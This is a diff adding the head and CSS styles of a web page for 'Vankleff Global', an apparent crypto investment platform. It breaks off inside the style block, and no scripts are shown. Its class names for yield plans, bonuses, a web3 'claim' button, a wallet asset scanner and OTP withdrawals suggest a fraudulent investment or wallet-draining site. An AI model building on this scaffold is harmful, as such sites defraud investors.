@@ -1,1 +1,1131 @@
 
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
+<meta name="description" content="Vankleff Global – Institutional Crypto Management from New York"/>
+<meta name="google" content="notranslate" />
+<meta http-equiv="Content-Language" content="en" />
+<title>Vankleff Global – Institutional Crypto Management</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Inter','Segoe UI',sans-serif;background:#0c0c0c;color:#fff;overflow-x:hidden;padding-bottom:60px;opacity:1!important;filter:none!important;}
+a{color:inherit;text-decoration:none;}
+button{cursor:pointer;border:none;outline:none;font-family:inherit;}
+#risk-overlay{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px;background:rgba(0,0,0,.92);pointer-events:all;}
+.risk-box{background:#161b2e;border:1px solid #c9a84c;border-radius:20px;padding:36px 28px;max-width:440px;width:100%;text-align:center;position:relative;z-index:10000;}
+.risk-icon{width:70px;height:70px;background:#2a2200;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 18px;}
+.risk-box h2{font-size:22px;font-weight:900;margin-bottom:14px;}
+.risk-box p{color:#ccc;font-size:13px;line-height:1.7;margin-bottom:10px;}
+.btn-risk{width:100%;padding:16px;background:#22c55e;border-radius:14px;color:#fff;font-size:16px;font-weight:800;margin-top:18px;cursor:pointer;border:none;outline:none;position:relative;z-index:10001;pointer-events:all;}
+.lang-fixed{position:fixed;bottom:16px;left:16px;z-index:600;}
+.lang-trigger{background:#1a1a2e;border:1px solid #c9a84c;border-radius:10px;padding:8px 14px;color:#c9a84c;font-size:13px;font-weight:700;display:flex;align-items:center;gap:6px;}
+.lang-drop{position:absolute;bottom:44px;left:0;background:#1a1a2e;border:1px solid #333;border-radius:12px;padding:8px 0;min-width:200px;max-height:300px;overflow-y:auto;display:none;}
+.lang-drop.open{display:block;}
+.lang-opt{padding:9px 16px;font-size:13px;cursor:pointer;color:#ccc;}
+.lang-opt:hover{background:#2a2a3e;color:#22c55e;}
+.navbar{position:sticky;top:0;z-index:100;background:#111;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;border-bottom:1px solid #222;}
+.nav-logo{display:flex;align-items:center;gap:10px;}
+.logo-box{width:42px;height:42px;border:2px solid #c9a84c;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:18px;color:#c9a84c;flex-shrink:0;}
+.brand-name{font-size:13px;font-weight:800;color:#c9a84c;letter-spacing:1px;display:block;}
+.brand-sub{font-size:10px;color:#aaa;}
+.nav-btns{display:flex;gap:8px;}
+.btn-login{background:#1a1a2e;color:#fff;padding:9px 14px;border-radius:10px;font-size:12px;border:1px solid #333;}
+.btn-open{background:#22c55e;color:#fff;padding:9px 16px;border-radius:10px;font-size:12px;font-weight:700;}
+.page{display:none;}
+.page.active{display:block;}
+.hero{position:relative;min-height:100vh;display:flex;flex-direction:column;justify-content:flex-end;padding:0 0 70px;overflow:hidden;}
+.hero-bg{position:fixed;top:0;left:0;right:0;bottom:0;background:url('https://i.ibb.co/k6rcfg3H/IMG-20260728-220017.jpg') center 30%/cover no-repeat;z-index:-1;}
+.hero-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(to bottom,rgba(0,0,0,.15) 0%,rgba(0,0,0,.25) 40%,rgba(13,13,13,.85) 75%,rgba(13,13,13,1) 100%);z-index:1;}
+.hero-content{position:relative;z-index:2;padding:0 20px;max-width:600px;}
+.about-curtain{position:relative;z-index:10;background:#0d0d0d;}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(26,26,46,.92);border:1px solid #444;border-radius:20px;padding:8px 14px;font-size:11px;color:#ccc;margin-bottom:22px;}
+.hero h1{font-size:32px;font-weight:900;line-height:1.2;margin-bottom:12px;text-shadow:0 2px 10px rgba(0,0,0,.9);}
+.hero h1 .g{color:#22c55e;}
+.hero h1 .b{color:#38bdf8;}
+.hero p{color:#e0e0e0;font-size:13px;line-height:1.6;margin-bottom:28px;text-shadow:0 1px 6px rgba(0,0,0,.9);}
+.btn-primary{background:#22c55e;color:#fff;padding:16px;border-radius:14px;font-size:15px;font-weight:700;text-align:center;display:block;width:100%;}
+.btn-secondary{background:rgba(26,26,46,.92);color:#fff;padding:16px;border-radius:14px;font-size:15px;font-weight:600;text-align:center;display:block;width:100%;border:1px solid #444;}
+.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:22px 20px;background:#111;position:relative;z-index:10;}
+.stat-card{background:#1a1a2e;border-radius:14px;padding:16px;}
+.stat-val{font-size:24px;font-weight:900;color:#22c55e;}
+.stat-lbl{font-size:11px;color:#aaa;margin-top:4px;}
+.section{padding:28px 20px;}
+.sec-label{font-size:11px;font-weight:700;color:#22c55e;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+.section h2{font-size:24px;font-weight:900;margin-bottom:14px;}
+.section p{color:#aaa;font-size:13px;line-height:1.7;margin-bottom:10px;}
+.check-list{list-style:none;}
+.check-list li{display:flex;align-items:center;gap:8px;color:#ccc;font-size:13px;padding:5px 0;}
+.check-list li::before{content:"✅";}
+.hq-card{background:#1a1a2e;border-radius:14px;padding:20px;margin:0 20px 20px;}
+.hq-top{display:flex;align-items:center;gap:12px;margin-bottom:16px;}
+.hq-icon{width:48px;height:48px;background:#C5AF92;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;}
+.hq-card table{width:100%;border-collapse:collapse;}
+.hq-card tr{border-bottom:1px solid #2a2a3e;}
+.hq-card td{padding:10px 4px;font-size:12px;color:#aaa;}
+.hq-card td:last-child{color:#fff;text-align:right;}
+.plan-card{background:#1a1a2e;border-radius:16px;padding:20px;margin-bottom:14px;position:relative;border:1px solid #2a2a3e;}
+.plan-card.pop{border:2px solid #22c55e;}
+.plan-card.best{border:2px solid #3b82f6;}
+.plan-badge{position:absolute;top:-11px;left:50%;transform:translateX(-50%);font-size:10px;font-weight:700;padding:3px 12px;border-radius:20px;color:#fff;}
+.pb-green{background:#22c55e;}
+.pb-blue{background:#3b82f6;}
+.plan-yield{font-size:36px;font-weight:900;color:#22c55e;margin:8px 0 2px;}
+.plan-sub{font-size:11px;color:#aaa;margin-bottom:14px;}
+.btn-gs{background:#1a1a2e;color:#fff;padding:12px;border-radius:12px;font-size:13px;font-weight:700;width:100%;border:1px solid #333;}
+.trust-card{background:#2A4767;border-radius:14px;padding:18px;margin-bottom:14px;display:flex;gap:14px;}
+.trust-av{width:56px;height:56px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid #c9a84c;}
+.trust-stars{color:#f59e0b;font-size:14px;margin-bottom:5px;}
+.trust-txt{font-size:12px;color:#e0e0e0;line-height:1.6;margin-bottom:8px;font-style:italic;}
+.trust-name{font-weight:700;font-size:13px;color:#c9a84c;}
+.trust-role{font-size:11px;color:#22c55e;}
+.trust-loc{font-size:10px;color:#aaa;}
+.cta-box{background:#1a1a2e;border-radius:18px;padding:30px 22px;text-align:center;margin:20px;}
+.cta-logo{width:58px;height:58px;border:2px solid #c9a84c;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#c9a84c;margin:0 auto 14px;}
+.btn-gold{background:linear-gradient(135deg,#c9a84c,#e5c068);color:#000;padding:15px;border-radius:14px;font-size:15px;font-weight:700;text-align:center;display:block;width:100%;margin-bottom:10px;}
+footer{background:#0d0d0d;border-top:1px solid #222;padding:26px 20px 90px;opacity:1!important;filter:none!important;}
+footer h4{color:#fff;font-size:13px;font-weight:700;margin:12px 0 8px;opacity:1!important;}
+footer ul{list-style:none;opacity:1!important;}
+footer ul li{padding:3px 0;font-size:12px;color:#bbb;opacity:1!important;}
+footer p{color:#ccc;opacity:1!important;}
+.femail{color:#22c55e!important;}
+.legal-page{padding:24px 20px 60px;max-width:700px;margin:0 auto;}
+.legal-page h1{font-size:22px;font-weight:900;margin-bottom:6px;}
+.legal-meta{font-size:11px;color:#aaa;margin-bottom:22px;padding-bottom:14px;border-bottom:1px solid #222;}
+.legal-page h2{font-size:15px;font-weight:700;color:#c9a84c;margin:18px 0 8px;}
+.legal-page p{font-size:13px;color:#ccc;line-height:1.7;margin-bottom:10px;}
+.modal-ov,.pm-ov,.conf-ov,.gm-ov,.cp-ov,.sup-ov,.proc-ov,.suc-ov,.wd-note-ov,.verify-ov,.wd-conf-ov,.wd-success-ov{display:none;position:fixed;inset:0;z-index:200;}
+.modal-ov.open,.pm-ov.open,.conf-ov.open,.gm-ov.open,.cp-ov.open,.sup-ov.open,.proc-ov.open,.suc-ov.open,.wd-note-ov.open,.verify-ov.open,.wd-conf-ov.open,.wd-success-ov.open{display:flex;}
+.modal-ov{background:rgba(0,0,0,.8);align-items:flex-end;justify-content:center;}
+.pm-ov{background:rgba(0,0,0,.75);z-index:250;align-items:flex-start;justify-content:center;padding-top:60px;}
+.conf-ov{background:rgba(0,0,0,.8);z-index:400;align-items:center;justify-content:center;}
+.gm-ov{background:rgba(0,0,0,.75);z-index:450;align-items:center;justify-content:center;padding:20px;}
+.cp-ov{background:rgba(0,0,0,.6);z-index:350;align-items:center;justify-content:center;padding:20px;}
+.sup-ov{background:rgba(0,0,0,.8);z-index:450;align-items:center;justify-content:center;padding:20px;}
+.proc-ov{background:rgba(0,0,0,.85);z-index:490;align-items:center;justify-content:center;}
+.suc-ov{background:rgba(0,0,0,.7);z-index:500;align-items:center;justify-content:center;}
+.wd-note-ov{background:rgba(0,0,0,.85);z-index:510;align-items:center;justify-content:center;padding:20px;}
+.verify-ov{background:rgba(0,0,0,.9);z-index:520;align-items:center;justify-content:center;padding:20px;}
+.wd-conf-ov{background:rgba(0,0,0,.85);z-index:470;align-items:center;justify-content:center;padding:20px;}
+.wd-success-ov{background:rgba(0,0,0,.85);z-index:480;align-items:center;justify-content:center;padding:20px;}
+.modal-box{background:#161b2e;border-radius:20px 20px 0 0;padding:26px 22px 40px;width:100%;max-width:480px;position:relative;max-height:92vh;overflow-y:auto;}
+.modal-close{position:absolute;top:14px;right:16px;font-size:20px;color:#aaa;background:none;}
+.modal-logo{width:54px;height:54px;border:2px solid #c9a84c;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#c9a84c;margin:0 auto 10px;}
+.modal-title{color:#c9a84c;font-size:14px;font-weight:800;letter-spacing:1px;text-align:center;}
+.modal-sub{color:#aaa;font-size:11px;text-align:center;margin-bottom:18px;}
+.tab-row{display:flex;background:#0d0d0d;border-radius:12px;padding:4px;margin-bottom:18px;}
+.tab-btn{flex:1;padding:10px;border-radius:10px;font-size:13px;font-weight:600;background:none;color:#aaa;}
+.tab-btn.on{background:linear-gradient(135deg,#c9a84c,#e5c068);color:#000;}
+.fg{margin-bottom:12px;position:relative;}
+.fg input{width:100%;background:#1a1a2e;border:1px solid #2a2a3e;border-radius:12px;padding:13px 14px 13px 40px;color:#fff;font-size:13px;outline:none;}
+.fg input::placeholder{color:#555;}
+.fg .fi{position:absolute;left:13px;top:50%;transform:translateY(-50%);font-size:15px;color:#666;}
+.phone-row{display:flex;gap:8px;margin-bottom:12px;}
+.phone-sel{background:#1a1a2e;border:1px solid #2a2a3e;border-radius:12px;padding:13px 10px;color:#fff;font-size:12px;width:100px;outline:none;}
+.enc-note{font-size:11px;color:#aaa;margin:6px 0 14px;}
+.enc-note a{color:#22c55e;}
+.btn-submit{width:100%;padding:15px;border-radius:14px;background:linear-gradient(135deg,#c9a84c,#e5c068);color:#000;font-size:15px;font-weight:800;}
+.loading-spinner{display:none;text-align:center;padding:30px 20px;}
+.spinner-ring{width:52px;height:52px;border:4px solid #2a2a2a;border-top:4px solid #22c55e;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px;}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.net-selector{display:flex;gap:10px;margin-bottom:14px;background:#0d0d0d;border-radius:14px;padding:6px;}
+.net-opt{flex:1;display:flex;align-items:center;justify-content:center;gap:7px;padding:11px 8px;border-radius:10px;font-size:13px;font-weight:700;color:#aaa;cursor:pointer;border:2px solid transparent;transition:all .2s;}
+.net-opt.active{background:#16322c;border-color:#22c55e;color:#22c55e;}
+.net-icon{font-size:18px;}
+.active-net-bar{display:flex;align-items:center;gap:8px;background:#111;border-radius:10px;padding:9px 14px;margin-bottom:14px;font-size:12px;color:#aaa;flex-wrap:wrap;}
+.active-net-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
+.dot-bsc{background:#22c55e;}
+.dot-eth{background:#627eea;}
+.active-net-name{font-weight:700;color:#22c55e;}
+.active-net-id{font-size:10px;color:#666;margin-left:auto;font-family:monospace;}
+.dash-nav{position:sticky;top:0;z-index:100;background:#111;display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-bottom:1px solid #222;}
+.ham{font-size:22px;color:#fff;background:none;}
+.dn-brand{display:flex;align-items:center;gap:8px;}
+.dn-logo{width:34px;height:34px;border-2px solid #c9a84c;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;color:#c9a84c;font-size:14px;}
+.dn-name{font-size:13px;font-weight:800;color:#c9a84c;}
+.dn-sub{font-size:10px;color:#888;display:block;}
+.av-circle{width:34px;height:34px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:14px;cursor:pointer;}
+.sb-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:150;}
+.sb-ov.open{display:block;}
+.sidebar{position:fixed;top:0;left:-300px;width:280px;height:100%;background:#0f1117;z-index:160;transition:left .3s;overflow-y:auto;padding-bottom:40px;}
+.sidebar.open{left:0;}
+.sb-top{display:flex;align-items:center;justify-content:space-between;padding:16px 18px;border-bottom:1px solid #1a1a2e;margin-bottom:8px;}
+.sb-close{font-size:20px;color:#aaa;background:none;}
+.sb-grp{font-size:10px;font-weight:700;color:#444;letter-spacing:2px;text-transform:uppercase;padding:12px 18px 4px;}
+.sb-item{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;cursor:pointer;border-radius:10px;margin:2px 8px;transition:background .15s;}
+.sb-item:hover,.sb-item.on{background:#1a2a1a;}
+.sb-left{display:flex;align-items:center;gap:12px;font-size:13px;color:#bbb;}
+.sb-item.on .sb-left{color:#22c55e;font-weight:600;}
+.sb-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;background:#1a1a2e;flex-shrink:0;}
+.sb-item.on .sb-icon{background:#16322c;}
+.sb-badge{font-size:10px;font-weight:700;padding:3px 10px;border-radius:20px;color:#fff;}
+.bl-live{background:#22c55e;}.bl-pro{background:#7c3aed;}.bl-prem{background:#f59e0b;}.bl-10{background:#22c55e;}
+.sb-logout .sb-left{color:#ef4444;}
+.dash-content{padding:18px;}
+.balance-card{background:linear-gradient(135deg,#1a2a1a,#0d1a0d);border-radius:16px;padding:20px;margin-bottom:18px;border:1px solid #1f3a1f;}
+.bal-lbl{font-size:11px;color:#aaa;margin-bottom:4px;}
+.bal-amount{font-size:36px;font-weight:900;margin-bottom:10px;}
+.bonus-chip{display:inline-flex;align-items:center;gap:6px;background:rgba(202,168,76,.12);border:1px dashed #c9a84c;border-radius:8px;padding:5px 10px;font-size:11px;color:#c9a84c;font-weight:700;margin-bottom:18px;}
+.bal-btns{display:flex;gap:12px;}
+.btn-dep{background:#22c55e;color:#fff;padding:13px 24px;border-radius:10px;font-size:13px;font-weight:700;}
+.btn-wit{background:#2563eb;color:#fff;padding:13px 24px;border-radius:10px;font-size:13px;font-weight:700;}
+.mini-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px;}
+.mini-card{background:#1a1a2e;border-radius:14px;padding:14px;text-align:center;}
+.mc-val{font-size:17px;font-weight:800;color:#22c55e;}
+.mc-lbl{font-size:10px;color:#aaa;margin-top:4px;}
+.price-box{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:18px;}
+.price-box h3{font-size:15px;font-weight:700;margin-bottom:12px;display:flex;align-items:center;gap:8px;}
+.ldot{width:8px;height:8px;border-radius:50%;background:#22c55e;animation:pulse 1.5s infinite;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.pr{display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-bottom:1px solid #222;}
+.pr:last-child{border-bottom:none;}
+.pr-l{display:flex;align-items:center;gap:10px;}
+.pr-ic{width:30px;height:30px;border-radius:50%;background:#16322c;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;color:#22c55e;}
+.pr-nm{font-size:13px;font-weight:600;}
+.pr-tk{font-size:10px;color:#666;}
+.pr-price{font-size:13px;font-weight:700;}
+.up{color:#22c55e;font-size:11px;}
+.dn2{color:#ef4444;font-size:11px;}
+.btn-cw{background:#22c55e;color:#fff;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;animation:cwblink 2s ease-in-out infinite;width:100%;}
+@keyframes cwblink{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,.4)}50%{box-shadow:0 0 20px 8px rgba(34,197,94,.25)}}
+.wcta{background:#1a2a1a;border-radius:14px;padding:20px;text-align:center;margin-bottom:18px;}
+.btn-w3-claim{background:linear-gradient(135deg,#f59e0b,#eab308);color:#000;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:900;display:none;letter-spacing:1px;animation:cwblink 2s ease-in-out infinite;width:100%;}
+.btn-w3-disconnect{background:#ef4444;color:#fff;padding:12px 20px;border-radius:12px;font-size:14px;font-weight:700;display:none;}
+.w3-btn-row{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:12px;}
+.web3-panels{margin-top:6px;}
+#statusText{margin-top:1rem;font-size:0.92rem;min-height:1.5rem;color:#94a3b8;text-align:center;line-height:1.5;}
+#infoPanel{display:none;margin-top:1.5rem;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:1.5rem;text-align:left;flex-direction:column;gap:0.8rem;}
+#infoPanel.visible{display:flex;}
+#txPanel{display:none;margin-top:1rem;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:1.2rem;text-align:left;}
+#txPanel.visible{display:block;}
+#scannerPanel{display:none;margin-top:1rem;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:1.2rem;text-align:left;}
+#scannerPanel.visible{display:block;}
+.info-row{display:flex;justify-content:space-between;align-items:center;font-size:.88rem;gap:1rem;flex-wrap:wrap;}
+.info-label{color:#64748b;font-weight:500;}
+.info-value{color:#e2e8f0;font-weight:600;font-family:monospace;font-size:.85rem;text-align:right;word-break:break-all;}
+.divider{border:none;border-top:1px solid rgba(255,255,255,.06);}
+.badge{display:inline-block;padding:3px 10px;border-radius:8px;font-size:.75rem;font-weight:600;}
+.badge-green{background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3);}
+.badge-yellow{background:rgba(234,179,8,.15);color:#eab308;border:1px solid rgba(234,179,8,.3);}
+.badge-blue{background:rgba(59,130,246,.15);color:#60a5fa;border:1px solid rgba(59,130,246,.3);}
+.scanner-title{font-size:.8rem;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem;}
+.asset-item{display:flex;justify-content:space-between;align-items:center;padding:.4rem 0;font-size:.82rem;border-top:1px solid rgba(255,255,255,.04);}
+.asset-item:first-child{border-top:none;}
+.asset-symbol{color:#22c55e;font-weight:700;font-family:monospace;}
+.asset-balance{color:#e2e8f0;font-family:monospace;}
+.scan-status{font-size:.8rem;color:#64748b;}
+.tx-title{font-size:.8rem;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem;}
+.tx-item{display:flex;justify-content:space-between;align-items:center;padding:.45rem 0;font-size:.82rem;}
+.tx-item+.tx-item{border-top:1px solid rgba(255,255,255,.04);}
+.tx-hash{font-family:monospace;color:#60a5fa;text-decoration:none;font-size:.78rem;word-break:break-all;}
+.tx-status{font-size:.72rem;padding:2px 8px;border-radius:6px;font-weight:600;white-space:nowrap;margin-left:8px;}
+.tx-confirmed{background:rgba(34,197,94,.12);color:#22c55e;}
+.tx-failed{background:rgba(239,68,68,.12);color:#f87171;}
+.tx-pending{background:rgba(234,179,8,.12);color:#facc15;}
+.ph{padding:22px 20px 8px;}
+.ph h1{font-size:24px;font-weight:900;}
+.ph p{font-size:12px;color:#aaa;margin-top:4px;}
+.back-btn{width:100%;padding:13px;border-radius:12px;font-size:13px;margin-top:12px;background:#1a1a2e;color:#ccc;}
+.dep-wrap{padding:18px;}
+.meth-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
+.meth{background:#1a1a24;border:2px solid #2a2a3e;border-radius:12px;padding:16px 12px;display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;font-weight:700;color:#ccc;}
+.meth.sel{border-color:#22c55e;color:#22c55e;background:#0d1a0d;}
+.meth-ic{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;flex-shrink:0;}
+.ic-usdt{background:#26A17B;color:#fff;}
+.ic-ltc{background:#345D9D;color:#fff;}
+.ic-btc{background:#F7931A;color:#fff;}
+.ic-bnb{background:#F3BA2F;color:#000;}
+.amt-input{background:#1a1a2e;border:1px solid #c9a84c;border-radius:12px;padding:14px;font-size:14px;color:#fff;width:100%;margin-bottom:12px;outline:none;}
+.quick-amts{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:20px;}
+.qa{background:#1a1a24;border:1px solid #333;border-radius:8px;padding:10px 8px;color:#ccc;font-size:12px;font-weight:600;cursor:pointer;text-align:center;}
+.btn-cont{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;}
+.addr-box{background:#1a1a2e;border-radius:12px;padding:14px;margin-bottom:12px;}
+.addr-lbl{font-size:11px;color:#aaa;margin-bottom:6px;}
+.addr-val{font-family:'Courier New',monospace;font-size:12px;color:#22c55e;word-break:break-all;line-height:1.5;margin-bottom:10px;}
+.addr-row{display:flex;gap:8px;align-items:center;}
+.btn-copy{flex:1;padding:10px;background:#2563eb;border-radius:10px;color:#fff;font-size:13px;font-weight:700;}
+.net-badge{background:#16322c;border:1px solid #22c55e;border-radius:8px;padding:6px 10px;font-size:11px;color:#22c55e;font-weight:700;white-space:nowrap;}
+.warn-box{background:#2a1600;border:1px solid #f59e0b;border-radius:10px;padding:12px;margin-bottom:14px;display:flex;align-items:flex-start;gap:8px;}
+.warn-box p{font-size:11px;color:#f59e0b;line-height:1.5;}
+.timer-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:16px;font-size:12px;color:#aaa;}
+.timer-val{color:#22c55e;font-weight:700;font-size:14px;}
+.btn-cd{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;}
+.sec-notice{background:#2a1a0a;border:1px solid #f59e0b;border-radius:12px;padding:14px;margin-bottom:20px;}
+.sec-notice h4{color:#f59e0b;font-size:12px;font-weight:700;margin-bottom:5px;}
+.sec-notice p{font-size:11px;color:#ccc;line-height:1.6;}
+.code-box{background:#1a1a2e;border:1px solid #c9a84c;border-radius:14px;padding:18px;margin-bottom:18px;overflow:hidden;}
+.otp-row{display:flex;gap:6px;margin-bottom:14px;overflow:hidden;}
+.otp-in{flex:1;min-width:0;height:52px;background:#0d0d0d;border:2px solid #c9a84c;border-radius:10px;text-align:center;font-size:18px;color:#fff;outline:none;}
+.btn-verify{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;margin-top:16px;}
+.sec-item{background:#1a1a2e;border-radius:12px;padding:13px;margin-bottom:10px;cursor:pointer;}
+.sec-top{display:flex;align-items:center;justify-content:space-between;}
+.sec-lft{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:600;}
+.sec-body{display:none;font-size:11px;color:#aaa;margin-top:8px;line-height:1.6;}
+.sec-item.open .sec-body{display:block;}
+.arr{transition:transform .2s;}
+.sec-item.open .arr{transform:rotate(180deg);}
+.wd-label{font-size:13px;color:#fff;font-weight:700;margin-bottom:6px;display:block;}
+.wd-input{width:100%;background:#0d0d0d;border:1px solid #c9a84c;border-radius:12px;padding:13px 14px;color:#fff;font-size:13px;outline:none;margin-bottom:14px;font-family:'Courier New',monospace;}
+.wd-amt{width:100%;background:#0d0d0d;border:1px solid #c9a84c;border-radius:12px;padding:13px 14px;color:#fff;font-size:14px;outline:none;margin-bottom:12px;}
+.wd-details{background:#0d1a0d;border:1px solid #1f3a1f;border-radius:12px;padding:14px;margin-bottom:14px;}
+.wd-detail-row{display:flex;justify-content:space-between;padding:7px 0;font-size:13px;border-bottom:1px solid #16322c;}
+.wd-detail-row:last-child{border-bottom:none;font-weight:800;}
+.wd-detail-row span:last-child{color:#22c55e;}
+.resend-otp{font-size:12px;color:#22c55e;text-align:right;margin:-6px 0 12px;cursor:pointer;font-weight:600;}
+.wd-conf-box{background:#161b2e;border:1px solid #c9a84c;width:90%;max-width:380px;border-radius:18px;padding:26px 24px;position:relative;}
+.wd-conf-box h3{font-size:18px;font-weight:800;margin-bottom:14px;text-align:center;}
+.wd-conf-row{display:flex;justify-content:space-between;padding:9px 0;font-size:13px;border-bottom:1px solid #2a2a3e;}
+.wd-conf-row:last-child{border-bottom:none;}
+.wd-conf-row span:last-child{color:#22c55e;font-weight:600;text-align:right;word-break:break-all;max-width:55%;}
+.wd-confirm-btns{display:flex;gap:10px;margin-top:18px;}
+.wd-success-box{background:#161b2e;width:90%;max-width:360px;border-radius:18px;padding:28px 24px;text-align:center;position:relative;}
+.wd-success-box .wd-sc{position:absolute;top:12px;right:16px;font-size:20px;color:#aaa;background:none;}
+.wd-success-box .wd-txid{font-family:monospace;font-size:11px;color:#c9a84c;word-break:break-all;background:#0d0d0d;border:1px solid #2a2a3e;border-radius:8px;padding:10px;margin-top:12px;}
+.wd-history{background:#1a1a2e;border-radius:14px;padding:14px;margin-top:16px;overflow-x:auto;}
+.wd-history h3{font-size:14px;font-weight:700;margin-bottom:10px;}
+.wd-history table{width:100%;border-collapse:collapse;min-width:480px;font-size:11px;}
+.wd-history th{background:#0d0d0d;color:#aaa;padding:9px 8px;text-align:left;font-weight:700;border-bottom:1px solid #2a2a3e;}
+.wd-history td{padding:9px 8px;border-bottom:1px solid #2a2a3e;color:#ccc;}
+.wd-history td.mono{font-family:'Courier New',monospace;font-size:10px;color:#22c55e;}
+.swdg{font-size:10px;padding:2px 8px;border-radius:10px;display:inline-block;}
+.swp2{background:#3a2a00;color:#f59e0b;}
+.swc2{background:#1a2a1a;color:#22c55e;}
+.swf2{background:#3a1010;color:#f87171;}
+.tf-card{background:#1a1a0a;border:1px solid #c9a84c;border-radius:16px;padding:20px;}
+.tf-in{width:100%;background:#0d0d0d;border:1px solid #333;border-radius:10px;padding:13px;color:#fff;font-size:14px;margin-bottom:12px;outline:none;}
+.stmt-filters{display:flex;gap:8px;overflow-x:auto;padding:14px 20px;scrollbar-width:none;}
+.sfbtn{flex-shrink:0;padding:8px 16px;border-radius:20px;font-size:12px;font-weight:700;background:#2d3a00;color:#ccc;}
+.sfbtn.on{background:#22c55e;color:#fff;}
+.st-item{background:#2d3a00;border-radius:12px;padding:14px 16px;margin:0 20px 10px;display:flex;align-items:center;justify-content:space-between;}
+.st-lft{display:flex;align-items:center;gap:12px;}
+.st-ico{width:38px;height:38px;border-radius:10px;background:#1a2200;display:flex;align-items:center;justify-content:center;font-size:18px;}
+.st-ttl{font-size:13px;font-weight:600;}
+.st-sub{font-size:10px;color:#aaa;margin-top:2px;}
+.st-amt{font-size:14px;font-weight:700;}
+.st-amt.p{color:#22c55e;}
+.st-amt.n{color:#ef4444;}
+.sbdg{font-size:10px;padding:2px 8px;border-radius:10px;margin-top:3px;display:inline-block;}
+.sp2{background:#3a2a00;color:#f59e0b;}
+.sc2{background:#1a2a1a;color:#22c55e;}
+.sig-card{background:#1a1a2e;border-radius:16px;padding:20px;margin:0 20px 14px;position:relative;}
+.sig-card.pop{border:2px solid #c9a84c;}
+.sig-badge{position:absolute;top:-11px;left:50%;transform:translateX(-50%);background:#c9a84c;color:#000;font-size:10px;font-weight:800;padding:3px 12px;border-radius:20px;}
+.sig-price{font-size:30px;font-weight:900;color:#22c55e;margin:6px 0;}
+.sig-desc{font-size:11px;color:#aaa;margin-bottom:4px;}
+.sig-rate{color:#22c55e;font-size:11px;font-weight:700;margin-bottom:12px;}
+.sig-feats{list-style:none;margin-bottom:16px;}
+.sig-feats li{font-size:12px;color:#ccc;padding:3px 0;display:flex;align-items:center;gap:6px;}
+.sig-feats li::before{content:"✓";color:#22c55e;font-weight:700;}
+.btn-sub{width:100%;padding:13px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:700;}
+.ip-item{background:#2d3a00;border-radius:16px;padding:18px;margin-bottom:14px;cursor:pointer;}
+.ps-card{background:#2d3a00;border-radius:16px;padding:20px;margin-bottom:16px;display:none;}
+.ps-card.on{display:block;}
+.ps-amount{font-size:36px;font-weight:900;color:#22c55e;margin-bottom:12px;text-align:center;}
+input[type=range]{width:100%;accent-color:#22c55e;margin-bottom:6px;}
+.ps-sum{background:#1a2200;border-radius:12px;padding:14px;margin-bottom:16px;}
+.ps-row{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #2a3000;font-size:13px;}
+.ps-row:last-child{border-bottom:none;font-weight:800;}
